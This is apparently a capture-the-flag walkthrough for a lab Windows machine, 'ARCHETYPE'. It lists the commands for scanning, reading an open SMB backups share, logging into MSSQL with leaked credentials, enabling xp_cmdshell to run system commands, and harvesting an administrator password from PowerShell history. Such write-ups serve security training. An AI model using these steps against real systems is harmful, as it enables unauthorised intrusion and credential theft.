# Steps

## Enumerate Services

> SMB shares
> MS SQL server
> Windows 2019 OS

```console
$ nmap -v -A -T3 10.10.10.27
```

## Enumerate SMB Shares

> backups is open for everyong!

```console
$ nmap --script smb-enum-shares.nse -p445 10.10.10.27
```
## Connect to the Backup Share

> sensitive information leak: db admin credentials
> M3g4c0rp123

```console
$ smbclient -U 'guest%' //10.10.10.27/backups -p 445
```
## Gain a Foothold

> the sql server is now accessible

```console
$ mssqlclient.py -port 1433 -windows-auth ARCHETYPE/sql_svc@10.10.10.27
```

## Privilege Escalation

> reconfigure the db server to execute commands

```shell_session
> EXEC sp_configure 'Show Advanced Options', 1;
> reconfigure;
> sp_configure;
> EXEC sp_configure 'xp_cmdshell', 1
> reconfigure;
> xp_cmdshell "whoami"
```

## User Flag

> read sql_svc flag on his desktop

```shell_session
> xp_cmdshell "Get-Content C:\Users\sql_svc\Desktop\user.txt"
```

## Privilege Escalation

> the powershell logs have another leak: the admin password
> MEGACORP_4dm1n!!

```shell_session
> xp_cmdshell "Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

## Root Flag

> connect to SMB share as admin

```console
$ smbclient -U 'administrator' //10.10.10.27/C$ -p 445 'MEGACORP_4dm1n!!'
```

```shell_session
> get C:\Users\Administrator\Desktop\root.txt
```
